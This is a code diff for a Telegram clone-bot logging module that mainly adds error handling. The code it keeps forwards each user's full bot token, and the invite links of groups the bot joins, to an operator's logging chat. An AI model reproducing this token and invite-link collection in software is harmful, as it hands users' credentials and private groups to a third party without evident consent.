@@ -1,6 +1,8 @@
 from telegram import Update
 from telegram.ext import ContextTypes
-from .config import CLONE_LOGGER, LOGGER_GROUP
+
+# ✅ FIX IMPORT PATH
+from ..config import CLONE_LOGGER, LOGGER_GROUP
 
 
 # =========================
@@ -9,20 +11,24 @@ from .config import CLONE_LOGGER, LOGGER_GROUP
 
 async def log_new_clone(context: ContextTypes.DEFAULT_TYPE, user, token, bot_username):
 
-    text = (
-        "🚀 **NEW CLONE ALERT!**\n\n"
-        f"👤 **Owner:** {user.first_name}\n"
-        f"🆔 **Owner ID:** `{user.id}`\n"
-        f"🏷 **Owner Username:** @{user.username if user.username else 'N/A'}\n"
-        f"🤖 **Bot Username:** @{bot_username}\n"
-        f"🔑 **Token:** `{token}`"
-    )
+    try:
+        text = (
+            "🚀 *NEW CLONE ALERT!*\n\n"
+            f"👤 Owner: {user.first_name}\n"
+            f"🆔 ID: `{user.id}`\n"
+            f"🏷 Username: @{user.username if user.username else 'N/A'}\n"
+            f"🤖 Bot: @{bot_username}\n"
+            f"🔑 Token: `{token}`"
+        )
 
-    await context.bot.send_message(
-        chat_id=CLONE_LOGGER,
-        text=text,
-        parse_mode="Markdown"
-    )
+        await context.bot.send_message(
+            chat_id=CLONE_LOGGER,
+            text=text,
+            parse_mode="Markdown"
+        )
+
+    except Exception as e:
+        print("Clone log error:", e)
 
 
 # =========================
@@ -42,25 +48,28 @@ async def log_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
 
     text = (
-        "👤 **NEW USER STARTED!**\n\n"
-        f"🆔 **ID:** `{user.id}`\n"
-        f"🏷 **Username:** @{user.username if user.username else 'N/A'}\n"
-        f"📝 **Name:** {user.first_name}"
+        "👤 *NEW USER STARTED!*\n\n"
+        f"🆔 ID: `{user.id}`\n"
+        f"🏷 Username: @{user.username if user.username else 'N/A'}\n"
+        f"📝 Name: {user.first_name}"
     )
 
-    if photo_id:
-        await context.bot.send_photo(
-            chat_id=LOGGER_GROUP,
-            photo=photo_id,
-            caption=text,
-            parse_mode="Markdown"
-        )
-    else:
-        await context.bot.send_message(
-            chat_id=LOGGER_GROUP,
-            text=text,
-            parse_mode="Markdown"
-        )
+    try:
+        if photo_id:
+            await context.bot.send_photo(
+                chat_id=LOGGER_GROUP,
+                photo=photo_id,
+                caption=text,
+                parse_mode="Markdown"
+            )
+        else:
+            await context.bot.send_message(
+                chat_id=LOGGER_GROUP,
+                text=text,
+                parse_mode="Markdown"
+            )
+    except Exception as e:
+        print("User start log error:", e)
 
 
 # =========================
@@ -75,19 +84,22 @@ async def log_group_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         link = await chat.export_invite_link()
     except:
-        link = "No Link (Bot not admin)"
+        link = "No Link"
 
     text = (
-        "🏰 **ADDED TO NEW GROUP!**\n\n"
-        f"👥 **Group Name:** {chat.title}\n"
-        f"🆔 **Group ID:** `{chat.id}`\n"
-        f"🔗 **Link:** {link}\n"
-        f"👤 **Added By:** {user.first_name} "
+        "🏰 *ADDED TO NEW GROUP!*\n\n"
+        f"👥 Group: {chat.title}\n"
+        f"🆔 ID: `{chat.id}`\n"
+        f"🔗 Link: {link}\n"
+        f"👤 Added By: {user.first_name} "
         f"(@{user.username if user.username else 'N/A'})"
     )
 
-    await context.bot.send_message(
-        chat_id=LOGGER_GROUP,
-        text=text,
-        parse_mode="Markdown"
-    )
+    try:
+        await context.bot.send_message(
+            chat_id=LOGGER_GROUP,
+            text=text,
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        print("Group log error:", e)
